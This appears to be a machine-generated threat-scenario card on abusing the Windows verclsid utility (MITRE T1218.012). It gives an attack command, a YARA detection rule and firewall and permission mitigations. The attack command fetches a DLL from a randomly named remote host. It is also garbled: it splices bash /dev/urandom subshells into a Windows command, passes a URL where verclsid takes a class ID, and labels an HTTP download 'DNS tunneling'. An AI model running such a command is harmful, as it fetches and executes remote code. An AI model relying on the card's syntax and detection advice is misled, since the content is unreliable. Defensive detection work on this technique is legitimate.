---
type: campaign
scenario_id: 459
tactic: Defense Evasion
technique: "T1218.012: Verclsid"
technique_id: T1218.012
tags: [campaign, lotl, defense_evasion]
---

# Using verclsid to execute DNS tunneling COM object.

## Threat Description
Using verclsid to execute DNS tunneling COM object.

## Attack Command
```
verclsid /C /S http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor verclsid HTTP: `wmic process where name='verclsid.exe' get commandline | findstr http`; YARA rule: `rule VerclsidDnsTunnel { strings: $a = /verclsid.*http/ nocase; condition: $a }`.

## Mitigation
Restrict verclsid: `icacls %windir%\System32\verclsid.exe /deny Everyone:RX`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block verclsid' dir=out program='%windir%\System32\verclsid.exe' action=block`.

## AI Training Prompt
Train AI to detect verclsid-based DNS tunneling COM execution by analyzing HTTP downloads, verclsid command-line arguments, and DNS query patterns; suggest DLL download restrictions.

## References
- MITRE ATT&CK T1218.012: https://attack.mitre.org/techniques/T1218/012/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
